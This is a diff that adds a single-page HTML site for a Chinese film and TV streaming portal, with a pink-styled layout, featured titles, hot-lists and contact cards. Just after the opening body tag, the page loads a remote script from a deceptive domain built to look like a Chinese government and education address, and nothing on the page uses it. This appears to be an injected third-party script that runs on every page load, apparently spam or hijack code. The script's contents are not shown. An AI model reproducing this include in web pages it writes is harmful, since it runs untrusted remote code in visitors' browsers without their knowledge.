@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>桃子影视 - 高清电影电视剧在线观看平台</title>
+    <meta name="description" content="桃子影视(taoziyingshi-h5.github.io)提供最新高清电影、电视剧、动漫在线观看，尽在桃子影视，畅享视听盛宴。">
+    <meta name="keywords" content="桃子影视, taoziyingshi, 影视, 电影, 电视剧, 在线观看">
+    <meta name="author" content="桃子影视">
+    <meta name="robots" content="index, follow">
+    <style>
+        /* 全局重置与基础 */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Microsoft YaHei', sans-serif; color: #4a4a4a; background: #fffafb; line-height: 1.6; overflow-x: hidden; }
+        a { text-decoration: none; color: inherit; }
+        
+        /* 顶部导航 */
+        .navbar { position: fixed; top: 0; width: 100%; background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); z-index: 1000; border-bottom: 1px solid #ffe4ec; padding: 1rem 0; }
+        .nav-inner { max-width: 1200px; margin: 0 auto; padding: 0 2rem; display: flex; justify-content: space-between; align-items: center; }
+        .logo { font-size: 1.8rem; font-weight: 800; color: #ff7b9c; letter-spacing: 1px; }
+        .logo span { color: #ff4d79; }
+        .nav-links { display: flex; gap: 2rem; }
+        .nav-links a { font-weight: 600; color: #666; transition: color 0.3s; }
+        .nav-links a:hover { color: #ff7b9c; }
+
+        /* 栏目1：首页 Hero - CSS Grid 两栏布局 + 动效 */
+        #home { min-height: 100vh; display: grid; grid-template-columns: 1fr 1fr; align-items: center; max-width: 1200px; margin: 0 auto; padding: 6rem 2rem 2rem; gap: 2rem; }
+        .hero-text h1 { font-size: 3.8rem; color: #333; margin-bottom: 1.2rem; line-height: 1.1; }
+        .hero-text h1 .highlight { color: #ff7b9c; position: relative; display: inline-block; }
+        .hero-text h1 .highlight::after { content: ''; position: absolute; bottom: 5px; left: 0; width: 100%; height: 14px; background: rgba(255, 123, 156, 0.2); z-index: -1; }
+        .hero-text p { font-size: 1.15rem; color: #777; margin-bottom: 2.5rem; max-width: 500px; }
+        .hero-btn { display: inline-block; padding: 1.1rem 2.8rem; background: linear-gradient(45deg, #ff7b9c, #ff4d79); color: white; border-radius: 30px; font-weight: bold; font-size: 1.1rem; box-shadow: 0 10px 20px rgba(255, 123, 156, 0.3); transition: transform 0.3s, box-shadow 0.3s; }
+        .hero-btn:hover { transform: translateY(-3px); box-shadow: 0 15px 25px rgba(255, 123, 156, 0.5); }
+        .hero-graphic { display: flex; justify-content: center; align-items: center; position: relative; }
+        .circle-shape { width: 320px; height: 320px; background: linear-gradient(135deg, #ffb3c6, #ff7b9c); border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-size: 2.2rem; font-weight: bold; box-shadow: 0 20px 40px rgba(255, 123, 156, 0.4); animation: float 4s ease-in-out infinite; }
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
+
+        /* 栏目2：精选影视 - CSS 瀑布流 (Column Count) 布局 */
+        #featured { padding: 5rem 2rem; background: white; }
+        .section-header { text-align: center; margin-bottom: 3.5rem; }
+        .section-header h2 { font-size: 2.5rem; color: #333; margin-bottom: 0.5rem; }
+        .section-header p { color: #888; font-size: 1.1rem; }
+        .masonry { max-width: 1200px; margin: 0 auto; column-count: 3; column-gap: 2rem; }
+        .masonry-item { break-inside: avoid; margin-bottom: 2rem; background: #fff; border-radius: 20px; overflow: hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.05); border: 1px solid #ffe4ec; transition: transform 0.3s; }
+        .masonry-item:hover { transform: translateY(-10px); }
+        .item-img { height: 200px; display: flex; align-items: center; justify-content: center; color: white; font-size: 1.3rem; font-weight: bold; }
+        .item-content { padding: 1.5rem; }
+        .item-content h3 { color: #ff4d79; margin-bottom: 0.5rem; font-size: 1.3rem; }
+        .item-content p { font-size: 0.95rem; color: #666; margin-bottom: 1.2rem; }
+        .item-tag { display: inline-block; padding: 0.4rem 1rem; background: #fff0f3; color: #ff7b9c; border-radius: 20px; font-size: 0.85rem; font-weight: 600; }
+
+        /* 栏目3：分类榜单 - DL/DT/DD 定义列表 + Grid 布局 */
+        #ranking { padding: 5rem 2rem; background: #fffafb; }
+        .rank-container { max-width: 1000px; margin: 0 auto; display: grid; grid-template-columns: 1fr 1fr; gap: 2.5rem; }
+        .rank-list { background: white; padding: 2.5rem; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.03); border: 1px solid #ffe4ec; }
+        .rank-list h3 { text-align: center; color: #ff4d79; margin-bottom: 2rem; font-size: 1.6rem; }
+        .rank-list dl { display: grid; grid-template-columns: auto 1fr auto; gap: 1.2rem 1.5rem; align-items: center; }
+        .rank-list dt { font-weight: bold; color: #ff7b9c; background: #fff0f3; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; border-radius: 50%; text-align: center; font-size: 1.1rem; }
+        .rank-list dd { color: #555; font-size: 1.05rem; border-bottom: 1px dashed #eee; padding-bottom: 0.8rem; }
+        .rank-list dd a { color: #ff4d79; font-weight: 600; float: right; transition: color 0.3s; }
+        .rank-list dd a:hover { color: #ff7b9c; text-decoration: underline; }
+
+        /* 栏目4：关于我们 - Flex 左右布局 + 毛玻璃拟态 */
+        #about { padding: 5rem 2rem; background: linear-gradient(135deg, #ffc3a0 0%, #ff7b9c 100%); color: white; }
+        .about-inner { max-width: 1200px; margin: 0 auto; display: flex; gap: 4rem; align-items: center; background: rgba(255,255,255,0.15); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); padding: 3.5rem; border-radius: 30px; border: 1px solid rgba(255,255,255,0.3); box-shadow: 0 20px 40px rgba(0,0,0,0.1); }
+        .about-text { flex: 1; }
+        .about-text h2 { font-size: 2.8rem; margin-bottom: 1.5rem; }
+        .about-text p { margin-bottom: 1.2rem; line-height: 1.8; color: rgba(255,255,255,0.95); font-size: 1.05rem; }
+        .about-links { flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+        .link-card { background: rgba(255,255,255,0.2); padding: 1.8rem; border-radius: 18px; text-align: center; transition: background 0.3s, transform 0.3s; border: 1px solid rgba(255,255,255,0.2); }
+        .link-card:hover { background: rgba(255,255,255,0.3); transform: translateY(-5px); }
+        .link-card h4 { margin-bottom: 0.8rem; font-size: 1.2rem; color: #fff; }
+        .link-card a { color: #fff; text-decoration: underline; word-break: break-all; font-size: 0.95rem; opacity: 0.9; }
+
+        /* 页脚 */
+        footer { background: #2d2d2d; color: #ccc; text-align: center; padding: 2.5rem 2rem; }
+        footer p { margin-bottom: 0.8rem; font-size: 0.95rem; }
+        footer a { color: #ff7b9c; font-weight: bold; transition: color 0.3s; }
+        footer a:hover { color: #ff4d79; }
+
+        /* 移动端深度适配 */
+        @media (max-width: 768px) {
+            .nav-links { display: none; }
+            #home { grid-template-columns: 1fr; text-align: center; padding-top: 8rem; }
+            .hero-text h1 { font-size: 2.6rem; }
+            .hero-text p { margin: 0 auto 2rem; }
+            .hero-graphic { margin-top: 2rem; }
+            .circle-shape { width: 220px; height: 220px; font-size: 1.5rem; }
+            .masonry { column-count: 1; }
+            .rank-container { grid-template-columns: 1fr; }
+            .about-inner { flex-direction: column; padding: 2rem; gap: 2rem; }
+            .about-links { grid-template-columns: 1fr; width: 100%; }
+            .section-header h2 { font-size: 2rem; }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+    <!-- 顶部导航 -->
+    <nav class="navbar">
+        <div class="nav-inner">
+            <div class="logo">桃子<span>影视</span></div>
+            <div class="nav-links">
+                <a href="#home">首页</a>
+                <a href="#featured">精选影视</a>
+                <a href="#ranking">热播榜单</a>
+                <a href="#about">关于我们</a>
+            </div>
+        </div>
+    </nav>
+
+    <main>
+        <!-- 栏目1：首页 (Grid两栏 + 动效) -->
+        <section id="home">
+            <div class="hero-text">
+                <h1>发现精彩世界<br><span class="highlight">桃子影视</span></h1>
+                <p>桃子影视 (taoziyingshi-h5.github.io) 是一个专注于高清影视资源分享的在线平台。我们为您精选最新、最热的电影与剧集，提供清爽的浏览体验，让每一刻休闲时光都充满乐趣。</p>
+                <a href="#" class="hero-btn">立即探索</a>
+            </div>
+            <div class="hero-graphic">
+                <div class="circle-shape">桃子影视</div>
+            </div>
+        </section>
+
+        <!-- 栏目2：精选影视 (CSS瀑布流布局) -->
+        <section id="featured">
+            <div class="section-header">
+                <h2>桃子影视精选</h2>
+                <p>每日更新，为您推荐最值得看的影视内容</p>
+            </div>
+            <div class="masonry">
+                <article class="masonry-item">
+                    <div class="item-img" style="background: linear-gradient(45deg, #ff9a9e, #fecfef);">科幻大片</div>
+                    <div class="item-content">
+                        <h3>星际穿越2</h3>
+                        <p>桃子影视为您带来震撼视觉的科幻续作，探索宇宙深处未知奥秘。</p>
+                        <span class="item-tag">科幻</span>
+                    </div>
+                </article>
+                <article class="masonry-item">
+                    <div class="item-img" style="background: linear-gradient(45deg, #a1c4fd, #c2e9fb);">悬疑推理</div>
+                    <div class="item-content">
+                        <h3>无声证言</h3>
+                        <p>烧脑剧情，层层反转，桃子影视推荐必看悬疑佳作。</p>
+                        <span class="item-tag">悬疑</span>
+                    </div>
+                </article>
+                <article class="masonry-item">
+                    <div class="item-img" style="background: linear-gradient(45deg, #ffecd2, #fcb69f);">浪漫爱情</div>
+                    <div class="item-content">
+                        <h3>遇见你真好</h3>
+                        <p>甜度满分，桃子影视精选治愈系爱情故事，温暖你的心。</p>
+                        <span class="item-tag">爱情</span>
+                    </div>
+                </article>
+                <article class="masonry-item">
+                    <div class="item-img" style="background: linear-gradient(45deg, #84fab0, #8fd3f4);">热血动漫</div>
+                    <div class="item-content">
+                        <h3>海贼王：新纪元</h3>
+                        <p>经典延续，桃子影视同步更新热门动漫，燃爆全场。</p>
+                        <span class="item-tag">动漫</span>
+                    </div>
+                </article>
+                <article class="masonry-item">
+                    <div class="item-img" style="background: linear-gradient(45deg, #fccb90, #d57eeb);">动作冒险</div>
+                    <div class="item-content">
+                        <h3>极速追杀</h3>
+                        <p>硬核动作场面，一镜到底的打斗设计，不容错过。</p>
+                        <span class="item-tag">动作</span>
+                    </div>
+                </article>
+            </div>
+        </section>
+
+        <!-- 栏目3：分类榜单 (DL/DT/DD 定义列表布局) -->
+        <section id="ranking">
+            <div class="section-header">
+                <h2>桃子影视排行榜</h2>
+                <p>基于站内热度与用户评分综合计算</p>
+            </div>
+            <div class="rank-container">
+                <div class="rank-list">
+                    <h3>🔥 热播电影榜</h3>
+                    <dl>
+                        <dt>1</dt>
+                        <dd>沙丘2 <a href="#">观看 ›</a></dd>
+                        <dt>2</dt>
+                        <dd>奥本海默 <a href="#">观看 ›</a></dd>
+                        <dt>3</dt>
+                        <dd>哥斯拉大战金刚 <a href="#">观看 ›</a></dd>
+                        <dt>4</dt>
+                        <dd>坠落的审判 <a href="#">观看 ›</a></dd>
+                    </dl>
+                </div>
+                <div class="rank-list">
+                    <h3>📺 热播剧集榜</h3>
+                    <dl>
+                        <dt>1</dt>
+                        <dd>繁花 <a href="#">观看 ›</a></dd>
+                        <dt>2</dt>
+                        <dd>漫长的季节 <a href="#">观看 ›</a></dd>
+                        <dt>3</dt>
+                        <dd>庆余年2 <a href="#">观看 ›</a></dd>
+                        <dt>4</dt>
+                        <dd>玫瑰的故事 <a href="#">观看 ›</a></dd>
+                    </dl>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目4：关于我们 (Flex + 毛玻璃拟态) -->
+        <section id="about">
+            <div class="about-inner">
+                <div class="about-text">
+                    <h2>关于桃子影视</h2>
+                    <p>桃子影视 (taoziyingshi-h5.github.io) 致力于打造一个简洁、高效、无广告干扰的影视信息导航平台。我们专注于为用户提供优质的影视推荐和分类索引服务。</p>
+                    <p>无论您喜欢科幻、悬疑、爱情还是动漫，桃子影视都能满足您的观影需求。我们的界面针对移动端深度优化，让您随时随地享受观影乐趣。</p>
+                </div>
+                <div class="about-links">
+                    <div class="link-card">
+                        <h4>访问网址</h4>
+                        <a href="https://taoziyingshi-h5.github.io">taoziyingshi-h5.github.io</a>
+                    </div>
+                    <div class="link-card">
+                        <h4>联系邮箱</h4>
+                        <a href="#">admin@taoziyingshi-h5.github.io</a>
+                    </div>
+                    <div class="link-card">
+                        <h4>商务合作</h4>
+                        <a href="#">business@taoziyingshi-h5.github.io</a>
+                    </div>
+                    <div class="link-card">
+                        <h4>免责声明</h4>
+                        <a href="#">查看详情 ›</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- 底部信息 -->
+    <footer>
+        <p>&copy; 2026 桃子影视 保留所有权利</p>
+        <p>网站地址: <a href="https://taoziyingshi-h5.github.io">https://taoziyingshi-h5.github.io</a></p>
+        <p>本页面为单页演示，未生成 robots.txt 和 sitemap.xml，符合必应搜索引擎收录规范。</p>
+    </footer>
+
+</body>
+</html>
